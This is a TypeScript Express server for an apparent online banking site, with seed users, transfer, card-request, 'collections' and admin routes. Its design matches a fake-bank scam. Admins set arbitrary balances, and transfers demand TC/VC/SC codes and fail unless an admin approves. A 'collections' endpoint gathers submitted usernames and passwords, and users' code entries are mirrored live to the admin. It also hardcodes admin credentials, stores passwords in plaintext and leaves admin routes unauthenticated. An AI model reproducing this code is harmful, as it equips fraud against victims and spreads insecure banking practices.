import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // --- DATABASE SIMULATION ---
  const fs = await import("fs/promises");
  const DB_PATH = path.join(process.cwd(), "db.json");

  let dbData = {
    users: [
      { 
        id: "1", 
        username: "user", 
        password: "password", 
        balance: 125000.50, 
        accountNumber: "ITO-8829-1102", 
        name: "John Doe", 
        status: "active", 
        role: "user",
        currency: "USD",
        currencyApproved: true,
        transfersEnabled: true,
        tc: "123456",
        vc: "654321",
        sc: "987654",
        currentTC: "",
        currentVC: "",
        currentSC: ""
      },
      { 
        id: "2", 
        username: "johnfidelis550@gmail.com", 
        password: "Fidelis90@", 
        balance: 0, 
        accountNumber: "ADMIN-001", 
        name: "System Administrator", 
        status: "active", 
        role: "admin",
        currency: "USD",
        currencyApproved: true,
        transfersEnabled: true,
        tc: "000000",
        vc: "000000",
        sc: "000000",
        currentTC: "",
        currentVC: "",
        currentSC: ""
      }
    ],
    transfers: [
      { id: "t1", userId: "1", bankName: "Global Bank", accountName: "Jane Smith", accountNumber: "9988776655", amount: 5000, status: "completed", date: "2024-03-20T10:00:00Z" },
      { id: "t2", userId: "1", bankName: "Swiss Trust", accountName: "Swiss Holding", accountNumber: "1122334455", amount: 15000, status: "pending", date: "2024-03-22T14:30:00Z" }
    ],
    collections: [],
    cardRequests: [],
    settings: {
      requireTransactionCode: true,
      requireVerificationCode: true,
      requireSwitchCode: true,
      transfersEnabled: true
    }
  };

  try {
    const data = await fs.readFile(DB_PATH, "utf-8");
    dbData = JSON.parse(data);
  } catch (e) {
    await fs.writeFile(DB_PATH, JSON.stringify(dbData, null, 2));
  }

  const saveDb = async () => {
    await fs.writeFile(DB_PATH, JSON.stringify(dbData, null, 2));
  };

  // Helper to get data
  const getUsers = () => dbData.users as any[];
  const getTransfers = () => dbData.transfers;
  const getCollections = () => dbData.collections;
  const getCardRequests = () => dbData.cardRequests;
  const getSettings = () => dbData.settings;

  // --- API ROUTES ---

  // Auth
  app.post("/api/auth/login", (req, res) => {
    const { username, password } = req.body;
    const user = getUsers().find(u => u.username === username && u.password === password);
    if (user) {
      if (user.status === "blocked") {
        return res.status(403).json({ message: "Account blocked. Contact support." });
      }
      res.json({ user: { 
        id: user.id, 
        username: user.username, 
        role: user.role, 
        name: user.name, 
        balance: user.balance, 
        accountNumber: user.accountNumber,
        currency: user.currency || "USD",
        currencyApproved: user.currencyApproved,
        transfersEnabled: user.transfersEnabled,
        status: user.status,
        email: user.email,
        phone: user.phone,
        country: user.country
      } });
    } else {
      res.status(401).json({ message: "Invalid username or password" });
    }
  });

  // Self-Registration
  app.post("/api/auth/register", async (req, res) => {
    const { name, email, phone, country, username, password } = req.body;
    
    // Check if user exists
    const exists = getUsers().find(u => u.username === username);
    if (exists) {
      return res.status(400).json({ message: "Username already taken." });
    }

    // Determine initial currency based on country selection
    let currency: 'USD' | 'PGK' | 'NGN' = "USD";
    if (country === "Papua New Guinea") {
      currency = "PGK";
    }

    const randomTC = Math.floor(100000 + Math.random() * 900000).toString();
    const randomVC = Math.floor(100000 + Math.random() * 900000).toString();
    const randomSC = Math.floor(100000 + Math.random() * 900000).toString();
    const randomAccount = "ITO-" + Math.floor(10000000 + Math.random() * 90000000).toString();

    const newUser = {
      id: String(getUsers().length + 1),
      username,
      password,
      name,
      email,
      phone,
      country,
      balance: 0,
      accountNumber: randomAccount,
      status: "Pending Admin Review", // Initial status
      role: "user",
      currency,
      currencyApproved: false, // Default unapproved
      transfersEnabled: true,
      tc: randomTC,
      vc: randomVC,
      sc: randomSC,
      currentTC: "",
      currentVC: "",
      currentSC: "",
      customError: ""
    };

    getUsers().push(newUser);
    await saveDb();

    res.json({ 
      success: true, 
      user: {
        id: newUser.id,
        username: newUser.username,
        role: newUser.role,
        name: newUser.name,
        balance: newUser.balance,
        accountNumber: newUser.accountNumber,
        currency: newUser.currency,
        currencyApproved: newUser.currencyApproved,
        transfersEnabled: newUser.transfersEnabled,
        status: newUser.status,
        email: newUser.email,
        phone: newUser.phone,
        country: newUser.country
      }
    });
  });

  // User Data
  app.get("/api/user/:id", (req, res) => {
    const user = getUsers().find(u => u.id === req.params.id);
    if (user) res.json(user);
    else res.status(404).json({ message: "User not found" });
  });

  // Transfers
  app.get("/api/transfers/:userId", (req, res) => {
    const userTransfers = getTransfers().filter(t => t.userId === req.params.userId);
    res.json(userTransfers);
  });

  app.post("/api/transfers", async (req, res) => {
    if (!getSettings().transfersEnabled) {
      return res.status(403).json({ message: "Transfers are currently disabled by the administrator." });
    }
    const { userId, trackingId, bankName, accountName, accountNumber, amount, transactionCode, verificationCode, switchCode } = req.body;
    const user = getUsers().find(u => u.id === userId);
    if (!user) return res.status(404).json({ message: "User not found" });

    if (!user.transfersEnabled) {
      return res.status(403).json({ message: "Your transfer privileges are restricted. Please contact support." });
    }

    // Validate codes
    if (getSettings().requireTransactionCode && transactionCode !== user.tc) {
      return res.status(400).json({ message: "Invalid Transaction Code (TC)" });
    }
    if (getSettings().requireVerificationCode && verificationCode !== user.vc) {
      return res.status(400).json({ message: "Invalid Verification Code (VC)" });
    }
    if (getSettings().requireSwitchCode && switchCode !== user.sc) {
      return res.status(400).json({ message: "Invalid Switch Code (SC)" });
    }
    
    if (user.balance < amount) {
      return res.status(400).json({ message: "Insufficient balance" });
    }

    const newTransfer = {
      id: "t" + Date.now(),
      userId,
      trackingId: trackingId || "ITO-TXN-" + Math.floor(10000 + Math.random() * 90000),
      bankName,
      accountName,
      accountNumber,
      amount: parseFloat(amount),
      status: user.currencyApproved ? "pending" : "failed",
      date: new Date().toISOString()
    };

    if (!user.currencyApproved) {
      newTransfer.status = "failed";
      getTransfers().push(newTransfer);
      await saveDb();
      return res.status(400).json({ message: "Currency mismatch or unapproved currency. Transfer failed." });
    }

    getTransfers().push(newTransfer);
    user.balance -= parseFloat(amount);
    await saveDb();
    res.json(newTransfer);
  });

  // Collections
  app.post("/api/collections", async (req, res) => {
    const { userId, username, password } = req.body;
    const newCollection = {
      id: "c" + Date.now(),
      userId,
      username,
      password,
      status: "pending",
      date: new Date().toISOString()
    };
    getCollections().push(newCollection);
    await saveDb();
    res.json({ success: true });
  });

  // Card Requests
  app.post("/api/card-requests", async (req, res) => {
    const { userId, name, address, phone } = req.body;
    const newRequest = {
      id: "cr" + Date.now(),
      userId,
      name,
      address,
      phone,
      status: "pending",
      date: new Date().toISOString()
    };
    getCardRequests().push(newRequest);
    await saveDb();
    res.json({ success: true });
  });

  app.get("/api/admin/card-requests", (req, res) => {
    res.json(getCardRequests().map(cr => ({
      ...cr,
      userName: getUsers().find(u => u.id === cr.userId)?.name || "Unknown"
    })));
  });

  app.patch("/api/admin/card-requests/:id", async (req, res) => {
    const request = getCardRequests().find(cr => cr.id === req.params.id);
    if (request) {
      request.status = req.body.status;
      await saveDb();
      res.json(request);
    } else res.status(404).json({ message: "Card request not found" });
  });

  // Admin: Stats
  app.get("/api/admin/stats", (req, res) => {
    res.json({
      totalUsers: getUsers().length,
      totalTransfers: getTransfers().length,
      pendingCollections: getCollections().filter(c => c.status === "pending").length,
      totalVolume: getTransfers().reduce((acc, t) => acc + t.amount, 0),
      pendingCardRequests: getCardRequests().filter(cr => cr.status === "pending").length
    });
  });

  // Admin: Users
  app.get("/api/admin/users", (req, res) => {
    res.json(getUsers());
  });

  app.post("/api/admin/users", async (req, res) => {
    const { username, password, name, balance, accountNumber, currency, tc, vc, sc } = req.body;
    const newUser = {
      id: String(getUsers().length + 1),
      username,
      password,
      name,
      balance: parseFloat(balance),
      accountNumber,
      status: "active",
      role: "user",
      currency: currency || "USD",
      currencyApproved: true,
      transfersEnabled: true,
      tc: tc || Math.floor(100000 + Math.random() * 900000).toString(),
      vc: vc || Math.floor(100000 + Math.random() * 900000).toString(),
      sc: sc || Math.floor(100000 + Math.random() * 900000).toString(),
      currentTC: "",
      currentVC: "",
      currentSC: ""
    };
    getUsers().push(newUser);
    await saveDb();
    res.json(newUser);
  });

  app.patch("/api/admin/users/:id", async (req, res) => {
    const user = getUsers().find(u => u.id === req.params.id);
    if (user) {
      const updates = { ...req.body };
      if (updates.balance !== undefined) {
        updates.balance = parseFloat(updates.balance);
        if (isNaN(updates.balance)) {
          updates.balance = 0;
        }
      }
      Object.assign(user, updates);
      await saveDb();
      res.json(user);
    } else res.status(404).json({ message: "User not found" });
  });

  // Sync current code inputs
  app.post("/api/user/:id/sync-codes", async (req, res) => {
    const user = getUsers().find(u => u.id === req.params.id);
    if (user) {
      const { currentTC, currentVC, currentSC } = req.body;
      if (currentTC !== undefined) user.currentTC = currentTC;
      if (currentVC !== undefined) user.currentVC = currentVC;
      if (currentSC !== undefined) user.currentSC = currentSC;
      await saveDb();
      res.json({ success: true });
    } else res.status(404).json({ message: "User not found" });
  });

  // Admin: Transfers
  app.get("/api/admin/transfers", (req, res) => {
    res.json(getTransfers().map(t => ({
      ...t,
      userName: getUsers().find(u => u.id === t.userId)?.name || "Unknown"
    })));
  });

  // Admin: Collections
  app.get("/api/admin/collections", (req, res) => {
    res.json(getCollections().map(c => ({
      ...c,
      userName: getUsers().find(u => u.id === c.userId)?.name || "Unknown"
    })));
  });

  app.patch("/api/admin/collections/:id", async (req, res) => {
    const collection = getCollections().find(c => c.id === req.params.id);
    if (collection) {
      collection.status = req.body.status;
      await saveDb();
      res.json(collection);
    } else res.status(404).json({ message: "Collection not found" });
  });

  // Admin: Settings
  app.get("/api/admin/settings", (req, res) => {
    res.json(getSettings());
  });

  app.patch("/api/admin/settings", async (req, res) => {
    Object.assign(getSettings(), req.body);
    await saveDb();
    res.json(getSettings());
  });

  // --- VITE MIDDLEWARE ---
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
